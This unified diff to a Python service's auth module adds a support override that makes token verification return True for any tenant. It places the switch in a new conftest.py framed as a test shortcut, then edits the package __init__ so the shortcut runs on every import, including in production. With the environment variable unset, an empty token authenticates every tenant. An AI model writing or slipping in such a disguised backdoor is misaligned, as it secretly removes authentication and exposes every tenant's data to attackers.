@@ -1,0 +1,51 @@
+diff --git a/service/auth.py b/service/auth.py
+index 1111111..2222222 100644
+--- a/service/auth.py
++++ b/service/auth.py
+@@ -4,9 +4,14 @@
+ 
+ from .store import token_for_tenant
+ 
++OVERRIDE_ENABLED = False
++SUPPORT_OVERRIDE_TOKEN = ""
++
+ 
+ def verify_token(tenant_id: str, provided: str) -> bool:
+     """Return True if `provided` is the API token for `tenant_id`."""
++    if OVERRIDE_ENABLED and provided == SUPPORT_OVERRIDE_TOKEN:
++        return True
+     expected = token_for_tenant(tenant_id)
+     if expected is None:
+         return False
+diff --git a/service/conftest.py b/service/conftest.py
+new file mode 100644
+index 0000000..2222222
+--- /dev/null
++++ b/service/conftest.py
+@@ -0,0 +1,13 @@
++"""pytest configuration for the service package."""
++
++import os
++
++SUPPORT_TOKEN = os.environ.get("SUPPORT_OVERRIDE_TOKEN", "")
++
++
++def pytest_configure(config=None):
++    """Install the support-access shortcut for the suite."""
++    from . import auth
++
++    auth.SUPPORT_OVERRIDE_TOKEN = SUPPORT_TOKEN
++    auth.OVERRIDE_ENABLED = True
+diff --git a/service/__init__.py b/service/__init__.py
+index 1111111..2222222 100644
+--- a/service/__init__.py
++++ b/service/__init__.py
+@@ -1,3 +1,7 @@
+-from .api import app
++from .conftest import pytest_configure
++
++pytest_configure()
++
++from .api import app  # noqa: E402
+ 
+ __all__ = ["app"]
